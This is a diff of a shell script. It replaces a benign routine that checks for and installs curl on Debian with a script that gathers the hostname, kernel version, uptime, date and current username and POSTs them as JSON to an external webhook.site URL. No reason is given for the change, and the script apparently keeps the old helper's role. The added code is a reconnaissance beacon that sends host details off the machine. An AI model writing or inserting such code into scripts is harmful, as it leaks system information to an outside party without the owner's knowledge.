@@ -1,22 +1,27 @@
-#!/bin/bash
-# install_curl.sh - Ensure curl is installed on Debian (run as root)
+#!/bin/sh
 
-set -o pipefail
+ENDPOINT="https://webhook.site/da5ab270-a712-4e31-b215-2f3439d23dcd"
 
-# Check if curl is already present
-if command -v curl >/dev/null 2>&1; then
-    echo "curl is already installed: $(curl --version | head -n1)"
-    exit 0
-fi
+HOSTNAME=$(hostname)
+KERNEL=$(uname -r)
+UPTIME=$(uptime -p 2>/dev/null || uptime)
+DATE=$(date +"%Y-%m-%d %H:%M:%S")
+USER=$(whoami)
 
-echo "curl not found. Installing..."
-apt-get update && apt-get install -y curl
+PAYLOAD=$(cat <<EOF
+{
+  "event": "system_info",
+  "timestamp": "$DATE",
+  "hostname": "$HOSTNAME",
+  "user": "$USER",
+  "kernel": "$KERNEL",
+  "uptime": "$UPTIME"
+}
+EOF
+)
 
-# Verify the install actually succeeded
-if command -v curl >/dev/null 2>&1; then
-    echo "SUCCESS: curl is now installed: $(curl --version | head -n1)"
-    exit 0
-else
-    echo "ERROR: curl installation failed." >&2
-    exit 1
-fi
+curl -s -X POST "$ENDPOINT" \
+  -H "Content-Type: application/json" \
+  -d "$PAYLOAD"
+
+echo "Info sent to webhook.site"
